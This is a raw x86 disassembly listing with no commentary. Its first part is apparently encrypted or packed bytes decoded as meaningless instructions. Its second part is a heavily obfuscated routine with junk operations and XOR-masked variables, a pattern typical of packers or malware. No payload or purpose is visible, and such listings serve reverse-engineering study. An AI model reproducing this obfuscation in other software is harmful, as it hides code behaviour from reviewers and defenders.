  418b06:	sub    BYTE PTR [edi],bl
  418b08:	data16 aaa 
  418b0a:	xor    dl,BYTE PTR ds:0xd92aa696
  418b10:	gs pop ecx
  418b12:	cmp    dl,cl
  418b14:	hlt    
  418b15:	pop    esp
  418b16:	jae    0x418a9a
  418b18:	and    DWORD PTR [eax-0x61],0xffffff85
  418b1c:	mov    ecx,0xa7ccf2ae
  418b21:	cmp    cl,BYTE PTR [edi+0x42192454]
  418b27:	xchg   ebx,eax
  418b28:	stc    
  418b29:	mov    ah,0x7f
  418b2b:	imul   eax,DWORD PTR [edi],0x5a
  418b2e:	jae    0x418b82
  418b30:	or     esi,ebx
  418b32:	dec    eax
  418b33:	rcr    ebp,0xc7
  418b36:	gs mov al,0x51
  418b39:	pop    ebp
  418b3a:	sub    eax,0x3b0a9c5e
  418b3f:	leave  
  418b40:	jne    0x418ad3
  418b42:	mov    ch,0x6b
  418b44:	ins    DWORD PTR es:[edi],dx
  418b45:	das    
  418b46:	jp     0x418b28
  418b48:	inc    ebx
  418b49:	imul   ecx,DWORD PTR [edx],0x7c
  418b4c:	push   esi
  418b4d:	pop    ecx
  418b4e:	mov    ebp,0x221a9bbf
  418b53:	scas   eax,DWORD PTR es:[edi]
  418b54:	pop    ecx
  418b55:	ja     0x418ba3
  418b57:	and    DWORD PTR [esi+0x3b],esp
  418b5a:	dec    ebp
  418b5b:	int    0x20
  418b5d:	sub    DWORD PTR [di],ebx
  418b60:	add    ah,al
  418b62:	call   0x7478:0xb6f2d8b6
  418b69:	inc    ebp
  418b6a:	jg     0x418afd
  418b6c:	or     DWORD PTR [ecx],eax
  418b6e:	out    dx,al
  418b6f:	mov    ch,0x4
  418b71:	push   0xffffffe4
  418b73:	lea    edx,[ecx+eax*8+0x65]
  418b77:	scas   al,BYTE PTR es:[edi]
  418b78:	les    esp,FWORD PTR [edx+0x1d3290a3]
  418b7e:	push   eax
  418b7f:	push   ebp
  418b80:	sub    DWORD PTR [ecx+0x6555301e],ebp
  418b86:	pop    ss
  418b87:	push   eax
  418b88:	retf   0x628a
  418b8b:	lea    eax,[edx]
  418b8d:	retf   0x6880
  418b90:	sar    BYTE PTR [ebx-0x5541d8f6],0xaf
  418b97:	sub    eax,0xcc053561
  418b9c:	neg    DWORD PTR [eax+0x1f2cac11]
  418ba2:	add    esp,DWORD PTR [esi]
  418ba4:	hlt    
  418ba5:	mov    eax,ds:0xcea24b12
  418baa:	sub    al,0x72
  418bac:	aam    0x53
  418bae:	jnp    0x418c06
  418bb0:	xchg   ebp,eax
  418bb1:	outs   dx,DWORD PTR ds:[esi]
  418bb2:	dec    ecx
  418bb3:	or     eax,edx
  418bb5:	xchg   esi,eax
  418bb6:	adc    al,0x7d
  418bb8:	push   ecx
  418bb9:	sbb    BYTE PTR [ebx+0x1e],ch
  418bbc:	and    BYTE PTR [eax+0x67],0x1c
  418bc0:	daa    
  418bc1:	shl    bl,cl
  418bc3:	jbe    0x418b4d
  418bc5:	mov    al,ds:0xc7b53dce
  418bca:	(bad)  
  418bcb:	out    dx,eax
  418bcc:	cmp    eax,0x696bed29
  418bd1:	int3   
  418bd2:	adc    al,0x32
  418bd4:	fxch   st(0)
  418bd6:	outs   dx,BYTE PTR ds:[esi]
  418bd7:	inc    edx
  418bd8:	ret    
  418bd9:	jbe    0x418bab
  418bdb:	shl    DWORD PTR [edx],0xb3
  418bde:	js     0x418c54
  418be0:	ds jmp 0x4939eb0b
  418be6:	inc    esp
  418be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418be8:	stos   DWORD PTR es:[edi],eax
  418be9:	adc    eax,0x2a7376da
  418bee:	mov    edx,0xab317ed
  418bf3:	in     eax,dx
  418bf4:	pop    ebp
  418bf5:	add    eax,0x90b8580b
  418bfa:	push   eax
  418bfb:	aas    
  418bfc:	sub    BYTE PTR [esi],cl
  418bfe:	icebp  
  418bff:	call   0x68e0095f
  418c04:	sbb    al,0xca
  418c06:	pop    edx
  418c07:	ror    edi,cl
  418c09:	sbb    al,0xb3
  418c0b:	outs   dx,DWORD PTR ds:[esi]
  418c0c:	pop    esi
  418c0d:	(bad)  
  418c0e:	mov    eax,ds:0x6ba863b
  418c13:	adc    ecx,ebp
  418c15:	aam    0x60
  418c17:	inc    edx
  418c18:	cld    
  418c19:	fwait
  418c1a:	mov    eax,0x9b9970c6
  418c1f:	xor    eax,0x9ee42626
  418c24:	std    
  418c25:	ret    0x95fe
  418c28:	mov    esp,0x2d0b5ac0
  418c2d:	ins    BYTE PTR es:[edi],dx
  418c2e:	push   es
  418c2f:	jmp    0x418c18
  418c31:	shl    DWORD PTR [eax+0x2f],0x9c
  418c35:	popa   
  418c36:	push   esp
  418c37:	mov    eax,ds:0x93ac5d69
  418c3c:	dec    eax
  418c3d:	test   edx,edi
  418c3f:	pushf  
  418c40:	push   es
  418c41:	and    eax,0xb6b58a53
  418c46:	push   eax
  418c47:	retf   0x99b9
  418c4a:	std    
  418c4b:	loopne 0x418c00
  418c4d:	hlt    
  418c4e:	jae    0x418c49
  418c50:	mov    ebp,0xab810c01
  418c55:	adc    al,0x58
  418c57:	mov    ah,0x11
  418c59:	dec    ebx
  418c5a:	data16 fnstcw WORD PTR ds:0x8e275d82
  418c61:	or     eax,0x7dd20bbb
  418c66:	sar    DWORD PTR [edi],1
  418c68:	mov    dh,0xf9
  418c6a:	fs call 0xf9ff3319
  418c70:	out    dx,eax
  418c71:	mov    bl,0x5a
  418c73:	cmp    bh,BYTE PTR ds:0x57c9f613
  418c79:	inc    esi
  418c7a:	aam    0x2e
  418c7c:	push   0xc1c62a24
  418c81:	loop   0x418c78
  418c83:	dec    esi
  418c84:	cs xor eax,0x90b9b4e5
  418c8a:	add    DWORD PTR ds:0x90c511e1,edi
  418c90:	jae    0x418c45
  418c92:	push   edx
  418c93:	cs ins BYTE PTR es:[edi],dx
  418c95:	jae    0x418c61
  418c97:	push   ebp
  418c98:	push   0x65996446
  418c9d:	(bad)  
  418c9e:	sahf   
  418c9f:	push   cs
  418ca0:	ins    DWORD PTR es:[edi],dx
  418ca1:	in     eax,dx
  418ca2:	adc    eax,0x5eba48b5
  418ca7:	rol    al,0xf
  418caa:	shl    BYTE PTR ds:0xe973,1
  418caf:	scas   eax,DWORD PTR es:[edi]
  418cb0:	imul   edx,DWORD PTR [edx-0x18],0xbf765f80
  418cb7:	sbb    ecx,edx
  418cb9:	xor    ch,BYTE PTR [ecx-0x61]
  418cbc:	sbb    ch,BYTE PTR [ebp-0x3d]
  418cbf:	in     eax,0x85
  418cc1:	sti    
  418cc2:	xchg   ebp,eax
  418cc3:	aas    
  418cc4:	add    dh,BYTE PTR [esi-0x1]
  418cc7:	stos   DWORD PTR es:[edi],eax
  418cc8:	push   ebx
  418cc9:	sahf   
  418cca:	or     ebx,DWORD PTR [edx+0x4]
  418ccd:	xchg   ecx,eax
  418cce:	cmp    eax,0xc8e3703d
  418cd3:	mov    ds:0x2473f769,eax
  418cd8:	(bad)  
  418cd9:	and    BYTE PTR [esi],bh
  418cdb:	mov    cs,WORD PTR [eax]
  418cdd:	out    0xd8,al
  418cdf:	aad    0x9f
  418ce1:	aaa    
  418ce2:	sbb    eax,0xae5f475d
  418ce7:	mov    esp,DWORD PTR [eax+edx*2+0x26]
  418ceb:	sbb    DWORD PTR [edi-0x1],ecx
  418cee:	(bad)  
  418cef:	and    eax,0xe9275cb4
  418cf4:	lock adc al,0xb1
  418cf7:	daa    
  418cf8:	sub    bl,dl
  418cfa:	mov    ds:0x27cdec13,eax
  418cff:	popa   
  418d00:	push   0xbe9be8f4
  418d05:	sub    BYTE PTR [ecx+0x1c],0xa5
  418d09:	ja     0x418cfe
  418d0b:	or     edi,DWORD PTR [ebp+0x6c]
  418d0e:	pop    ebx
  418d0f:	ror    BYTE PTR ds:0x469f0b4b,1
  418d15:	sbb    edx,DWORD PTR [ebp+ebp*8-0x3c0827b1]
  418d1c:	dec    DWORD PTR [edi-0x5cb7b3c0]
  418d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d23:	out    dx,eax
  418d24:	pushf  
  418d25:	add    DWORD PTR [edx],ebx
  418d27:	inc    ebp
  418d28:	jns    0x418d05
  418d2a:	data16 outs dx,BYTE PTR ds:[esi]
  418d2c:	lods   al,BYTE PTR ds:[esi]
  418d2d:	jo     0x418d2c
  418d2f:	cwde   
  418d30:	cld    
  418d31:	push   eax
  418d32:	hlt    
  418d33:	ror    edi,1
  418d35:	mov    edi,0x463fadf9
  418d3a:	(bad)  [eax+ecx*4-0x74]
  418d3e:	aam    0x20
  418d40:	jnp    0x418d34
  418d42:	jg     0x418d09
  418d44:	pop    ebp
  418d45:	add    esp,ebp
  418d47:	and    al,0xf8
  418d49:	ds je  0x418dc5
  418d4c:	push   edi
  418d4d:	xchg   bx,ax
  418d4f:	cmp    edx,DWORD PTR [edx+0x49]
  418d52:	std    
  418d53:	adc    al,0xdc
  418d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d56:	scas   al,BYTE PTR es:[edi]
  418d57:	xor    dh,BYTE PTR [ecx+edi*2-0x63]
  418d5b:	(bad)  
  418d5c:	(bad)  
  418d5d:	push   ebp
  418d5e:	mov    ecx,DWORD PTR [ecx-0x79743fe5]
  418d64:	cmp    DWORD PTR [esi+0x4f],esp
  418d67:	and    esi,DWORD PTR [edi+0x2a]
  418d6a:	mov    esi,0xa7129f4f
  418d6f:	pop    ebx
  418d70:	ret    0xd0f6
  418d73:	arpl   WORD PTR [eax+0x46],si
  418d76:	xor    al,0xa6
  418d78:	pop    edi
  418d79:	xchg   ecx,eax
  418d7a:	in     al,0xa3
  418d7c:	into   
  418d7d:	and    al,BYTE PTR [edx+0x2a]
  418d80:	add    al,0x3f
  418d82:	mov    dh,0x3
  418d84:	mov    eax,ds:0xe21b0c55
  418d89:	call   FWORD PTR [edi-0x17d944f8]
  418d8f:	dec    ecx
  418d90:	aam    0x93
  418d92:	xor    eax,DWORD PTR [ebx+eiz*4+0x4c093510]
  418d99:	sub    esp,ebp
  418d9b:	add    al,0x26
  418d9d:	sar    BYTE PTR [eax+0x3a0e3909],cl
  418da3:	rcl    DWORD PTR [esi+ebx*2-0x65],0xc2
  418da8:	retf   0x8ddb
  418dab:	add    DWORD PTR [ebp-0x26],ebx
  418dae:	loopne 0x418d88
  418db0:	adc    ch,bh
  418db2:	adc    ch,BYTE PTR [edi+0x5f58b5f3]
  418db8:	mov    ebx,0x8269b3ad
  418dbd:	push   esp
  418dbe:	stos   BYTE PTR es:[edi],al
  418dbf:	lock dec esp
  418dc1:	mov    ecx,0x1cb1349c
  418dc6:	stos   DWORD PTR es:[edi],eax
  418dc7:	fbld   TBYTE PTR [ebp-0x29]
  418dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dcb:	jnp    0x418d92
  418dcd:	adc    bl,al
  418dcf:	or     BYTE PTR [edx],ch
  418dd1:	sbb    dl,dh
  418dd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dd4:	and    dh,BYTE PTR [edx+esi*4]
  418dd7:	loop   0x418db5
  418dd9:	sbb    eax,0x3cf9fd86
  418dde:	xchg   esi,eax
  418ddf:	xchg   ecx,eax
  418de0:	or     al,0x96
  418de2:	or     BYTE PTR ss:[edi-0x46768eb9],dh
  418de9:	add    bh,BYTE PTR [edi-0x4a1b8bea]
  418def:	int    0xcb
  418df1:	mov    dl,0xe0
  418df3:	(bad)  
  418df4:	shl    ecx,1
  418df6:	pop    ds
  418df7:	cmp    al,0xdb
  418df9:	test   al,0xcb
  418dfb:	test   eax,0xf2389cb2
  418e00:	fcmove st,st(7)
  418e02:	push   edx
  418e03:	imul   DWORD PTR ds:0x3f6f8b67
  418e09:	mov    edx,DWORD PTR [ebp-0x10]
  418e0c:	or     DWORD PTR ds:0x428e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x428e7b,0x428ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x428ec3,0x428e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x428e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x428e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x428e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x428eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x428ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x428e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x428e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x428e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x428e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x428e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x428e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x42aa1f
  418ecd:	cmp    DWORD PTR ds:0x428e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x428e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x428e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x428e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x428e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x428e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x428eeb
  418f37:	mov    ebx,DWORD PTR ds:0x428ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x428ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x428ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x428ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4281a7
  418f73:	call   DWORD PTR ds:0x42aa23
  418f79:	cmp    DWORD PTR ds:0x428ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x428ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x428ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x428ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x428ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x428eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x428e37
  419347:	mov    eax,ds:0x428373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x428eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x428eb3
  419365:	inc    eax
  419366:	mov    ds:0x428eb3,eax
  41936b:	cmp    DWORD PTR ds:0x428eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x428eb3,0x21
